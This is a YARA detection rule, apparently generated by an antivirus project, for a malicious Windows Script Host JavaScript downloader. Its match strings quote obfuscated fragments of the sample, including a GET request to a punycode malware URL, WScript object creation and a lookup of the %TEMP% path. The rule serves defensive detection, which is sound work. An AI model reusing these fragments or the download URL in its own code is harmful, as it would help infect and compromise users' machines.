rule sig_20160428_04bb992516d7f2986716046b07020005 {
  meta:
    description = "datamaliciousorder - file 20160428_04bb992516d7f2986716046b07020005.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3716eac4b1356acd4255e8b417161dda2752ee7e0ce5b59241a122146dfc24f4"

  strings:
    $s1  = "EznAylXpjXazLeuRknSja[ImeXopAxrRctMerDfpVuf](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "function AxaCdaIusLptLdjAtkMmi(QhuGqtChcEjxLcjIytKul){RvbKpjEymLusWceZaaCog[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function DdjFziMuqWqyNjjTafMde() {return RvbKpjEymLusWceZaaCog[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function AxaCdaIusLptLdjAtkMmi(QhuGqtChcEjxLcjIytKul){RvbKpjEymLusWceZaaCog[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var RvbKpjEymLusWceZaaCog = function IjtXteXewPoxCmiOyxZwd() {return XljUrfHxcEmoGllEsmCen[SlsEvkPqzEpcRhrBumAfc](\"WScript\"+\"" ascii
    $s6  = "function IvrIubLhaLqeIplZkuIpi(FeqOwsLhgCfsMrfDszFqe, RfbPhrZmoHyoKusDkaFgo){FclEfnAvoWosIovUwyJeu = FclEfnAvoWosIovUwyJeu * 1; " ascii
    $s7  = "return FeqOwsLhgCfsMrfDszFqe - RfbPhrZmoHyoKusDkaFgo;};" fullword ascii
    $s8  = "var RvbKpjEymLusWceZaaCog = function IjtXteXewPoxCmiOyxZwd() {return XljUrfHxcEmoGllEsmCen[SlsEvkPqzEpcRhrBumAfc](\"WScript\"+\"" ascii
    $s9  = "var XljUrfHxcEmoGllEsmCen = this[\"WScript\"];" fullword ascii
    $s10 = "function DdjFziMuqWqyNjjTafMde() {return RvbKpjEymLusWceZaaCog[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function IvrIubLhaLqeIplZkuIpi(FeqOwsLhgCfsMrfDszFqe, RfbPhrZmoHyoKusDkaFgo){FclEfnAvoWosIovUwyJeu = FclEfnAvoWosIovUwyJeu * 1; " ascii
    $s12 = "if (EznAylXpjXazLeuRknSja[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function MybJhtLpgYvaPcmKskSsp(){return IhuWaeCnfXofLguRejZaq + \"\";};" fullword ascii
    $s14 = "function JnxIxhWrsLwlCweGlnBei() {return ((WwmVrnFoaXhjZgqHujMqw == true) && (WwmVrnFoaXhjZgqHujMqw == ImjWcmMnoQusDzbNtnAjm)) ?" ascii
    $s15 = "function JnxIxhWrsLwlCweGlnBei() {return ((WwmVrnFoaXhjZgqHujMqw == true) && (WwmVrnFoaXhjZgqHujMqw == ImjWcmMnoQusDzbNtnAjm)) ?" ascii
    $s16 = "RfqYldRpsGbpLxsQwcHhi = true;" fullword ascii
    $s17 = "var EhsEeqNjxRxeRkfUjuPek = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var RfqYldRpsGbpLxsQwcHhi = false;" fullword ascii
    $s19 = "var WwmVrnFoaXhjZgqHujMqw = false;" fullword ascii
    $s20 = "function HkuUqoOvzErwZtuTcpCdp(DlkZhsIomRedMpeSbfJlv) {var SxiStvLbrDeyPayQoqZim = (1, 2, 3, 4, 5, DlkZhsIomRedMpeSbfJlv); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}